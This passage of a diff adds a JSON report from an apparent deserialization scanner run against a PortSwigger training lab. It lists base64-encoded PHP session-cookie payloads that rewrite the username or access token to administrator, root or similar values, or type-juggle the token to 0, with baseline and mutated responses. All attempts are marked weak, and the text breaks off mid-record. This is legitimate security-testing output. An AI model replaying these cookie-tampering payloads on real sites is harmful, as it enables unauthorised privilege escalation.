@@ -1,0 +1,1372 @@
+{
+  "target": "0aa700eb032e6b088118265c00b600c3.web-security-academy.net",
+  "disclaimer": "All findings are Suspected — the tool flags candidates and never auto-confirms; verify each manually.",
+  "stats": {
+    "vectors_scanned": 162,
+    "after_filter": 6,
+    "findings": 6,
+    "dynamic_strong": 0
+  },
+  "findings": [
+    {
+      "url": "https://0aa700eb032e6b088118265c00b600c3.web-security-academy.net/my-account?id=wiener",
+      "method": "GET",
+      "location": "cookie",
+      "name": "session",
+      "type": "PHP",
+      "subtype": null,
+      "confidence": "High",
+      "exploit_type": "Privilege Escalation — String Manipulation",
+      "suggested_probe": "modify_string",
+      "severity": "Medium",
+      "severity_note": null,
+      "evidence": "dynamic-weak",
+      "notes": "String field detected — try changing role/privilege value",
+      "normalized": [
+        "O:4:\"User\":2:{s:8:\"username\";s:6:\"wiener\";s:12:\"access_token\";s:32:\"c26fb9dc13q2g6v68vspsxxi4baxlwsx\";}"
+      ],
+      "mutations_count": 10,
+      "indicators": [
+        "Status code changed: baseline=200 mutated=500",
+        "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.99) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+      ],
+      "attempts": [
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI6ImMyNmZiOWRjMTNxMmc2djY4dnNwc3h4aTRiYXhsd3N4Ijt9",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.99) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 3406,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2577,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class="
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI6ImMyNmZiOWRjMTNxMmc2djY4dnNwc3h4aTRiYXhsd3N4Ijt9",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.99) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 3406,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2569,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class="
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjQ6InJvb3QiO3M6MTI6ImFjY2Vzc190b2tlbiI7czozMjoiYzI2ZmI5ZGMxM3EyZzZ2Njh2c3BzeHhpNGJheGx3c3giO30=",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.99) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 3406,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2568,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class="
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjk6InN1cGVydXNlciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJjMjZmYjlkYzEzcTJnNnY2OHZzcHN4eGk0YmF4bHdzeCI7fQ==",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.99) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 3406,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2573,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class="
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjt9",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.95) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 3406,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2793,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class="
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjU6ImFkbWluIjt9",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.95) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 3406,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2785,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class="
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjQ6InJvb3QiO30=",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.95) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 3406,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2784,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class="
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjk6InN1cGVydXNlciI7fQ==",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.95) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 3406,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2789,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class="
+          }
+        },
+        {
+          "payload_type": "type_juggle",
+          "chain": "access_token->i:0",
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtpOjA7fQ==",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.95) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 3406,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2781,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class="
+          }
+        },
+        {
+          "payload_type": "type_juggle_privesc",
+          "chain": "username=administrator + access_token=i:0",
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.99) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 3406,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2577,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class="
+          }
+        }
+      ]
+    },
+    {
+      "url": "https://0aa700eb032e6b088118265c00b600c3.web-security-academy.net/my-account?id=wiener",
+      "method": "GET",
+      "location": "cookie",
+      "name": "session",
+      "type": "PHP",
+      "subtype": null,
+      "confidence": "High",
+      "exploit_type": "Privilege Escalation — String Manipulation",
+      "suggested_probe": "modify_string",
+      "severity": "Medium",
+      "severity_note": null,
+      "evidence": "dynamic-weak",
+      "notes": "String field detected — try changing role/privilege value",
+      "normalized": [
+        "O:4:\"User\":2:{s:8:\"username\";s:6:\"wiener\";s:12:\"access_token\";s:32:\"c26fb9dc13q2g6v68vspsxxi4baxlwsx\";}"
+      ],
+      "mutations_count": 10,
+      "indicators": [
+        "Status code changed: baseline=200 mutated=500",
+        "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.99) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+      ],
+      "attempts": [
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI6ImMyNmZiOWRjMTNxMmc2djY4dnNwc3h4aTRiYXhsd3N4Ijt9",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.99) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 3406,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2577,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class="
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI6ImMyNmZiOWRjMTNxMmc2djY4dnNwc3h4aTRiYXhsd3N4Ijt9",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.99) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 3406,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2569,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class="
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjQ6InJvb3QiO3M6MTI6ImFjY2Vzc190b2tlbiI7czozMjoiYzI2ZmI5ZGMxM3EyZzZ2Njh2c3BzeHhpNGJheGx3c3giO30=",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.99) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 3406,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2568,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class="
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjk6InN1cGVydXNlciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJjMjZmYjlkYzEzcTJnNnY2OHZzcHN4eGk0YmF4bHdzeCI7fQ==",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.99) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 3406,
